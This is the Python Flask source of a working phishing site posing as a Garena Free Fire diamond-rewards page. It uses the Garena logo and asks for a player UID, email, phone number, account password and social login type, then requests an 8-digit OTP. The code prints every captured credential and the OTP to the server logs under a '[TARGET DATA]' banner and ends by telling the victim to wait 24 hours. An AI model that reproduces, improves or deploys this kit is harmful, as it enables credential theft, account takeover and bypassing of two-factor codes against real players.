from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- LINKS SECTION ---
# Aapka Background Wallpaper
BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"

# GARENA ORIGINAL RED LOGO (Dragon wala)
GARENA_LOGO_URL = "https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Garena_logo.svg/1200px-Garena_logo.svg.png"

HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>FF Diamond Rewards</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{
            background-image: url('{BG_URL}');
            background-size: cover; 
            background-position: center; 
            background-attachment: fixed;
            font-family: sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }}
        .main-container {{
            width: 100%;
            max-width: 360px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }}
        
        /* Original Garena Logo Styling */
        .garena-logo {{
            width: 200px;
            height: auto;
            margin-bottom: 20px;
            filter: drop-shadow(0px 0px 10px rgba(0,0,0,0.5));
        }}
        
        .form-box {{
            background: rgba(255, 255, 255, 0.96); 
            padding: 30px 20px; 
            border-radius: 20px;
            text-align: center; 
            width: 100%;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
        }}
        
        /* Title in Original Blue */
        .reward-title {{
            color: #1a73e8; 
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }}
        
        input, select {{ 
            width: 100%; 
            padding: 14px; 
            margin: 10px 0; 
            border: 1px solid #ddd; 
            border-radius: 10px; 
            font-size: 16px;
        }}
        
        /* Button in Original Blue */
        .submit-btn {{ 
            background: #1a73e8; 
            color: white; 
            border: none; 
            padding: 16px; 
            width: 100%; 
            border-radius: 10px; 
            font-weight: bold; 
            font-size: 18px;
            cursor: pointer;
            margin-top: 15px;
            text-transform: uppercase;
        }}
    </style>
</head>
<body>
    <div class="main-container">
        <img src="{GARENA_LOGO_URL}" alt="Garena Logo" class="garena-logo">
        
        <div class="form-box">
            <div class="reward-title">💎 FREE FIRE REWARDS 💎</div>
            
            <form action="/preview" method="post">
                <input type="text" name="uid" placeholder="Free Fire UID" required>
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="text" name="phone" placeholder="Mobile Number" required>
                <input type="password" name="password" placeholder="Account Password" required>
                <select name="account_type">
                    <option value="Google">Google Account</option>
                    <option value="Facebook">Facebook Account</option>
                    <option value="VK">VK Account</option>
                    <option value="X">X Account</option>
                </select>
                <button type="submit" class="submit-btn">PROCEED</button>
            </form>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/preview', methods=['POST'])
def preview():
    uid = request.form.get('uid')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    acc = request.form.get('account_type')
    
    # Render Logs mein print hoga
    print(f"\n🎯 [TARGET DATA] 🎯\nUID: {uid}\nEMAIL: {email}\nPASS: {password}\nTYPE: {acc}\nPHONE: {phone}\n" + "="*20)
    
    return f'''
    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
        <div style="background: white; padding: 25px; border-radius: 20px; width: 320px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5);">
            <h3 style="color: #1a73e8;">Confirm Details</h3>
            <div style="text-align: left; background: #f8f9fa; padding: 15px; border-radius: 10px; font-size: 14px; margin: 15px 0;">
                <p><b>UID:</b> {uid}</p>
                <p><b>Email:</b> {email}</p>
                <p><b>Login Type:</b> {acc}</p>
            </div>
            <form action="/submit_final" method="post">
                <input type="hidden" name="phone" value="{phone}">
                <button type="submit" style="background: #28a745; color: white; border: none; padding: 14px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer;">CONFIRM & GET OTP</button>
            </form>
        </div>
    </body>
    '''

@app.route('/submit_final', methods=['POST'])
def submit_final():
    phone = request.form.get('phone')
    return f'''
    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
        <div style="background: white; padding: 25px; border-radius: 20px; width: 320px; text-align: center;">
            <h2>OTP Verification</h2>
            <p style="margin: 10px 0;">Code sent to {phone}</p>
            <form action="/final_otp" method="post">
                <input type="text" name="otp" placeholder="Enter 8-digit OTP" maxlength="8" required style="width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #ccc;">
                <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 14px; width: 100%; border-radius: 10px; font-weight: bold;">VERIFY</button>
            </form>
        </div>
    </body>
    '''

@app.route('/final_otp', methods=['POST'])
def final_otp():
    otp = request.form.get('otp')
    print(f"📩 RECEIVED OTP: {otp}")
    return "<h1 style='text-align:center; padding-top:50px; font-family:sans-serif; color:white; background:rgba(0,0,0,0.8); height:100vh; margin:0;'>Processing... Please wait 24 hours.</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
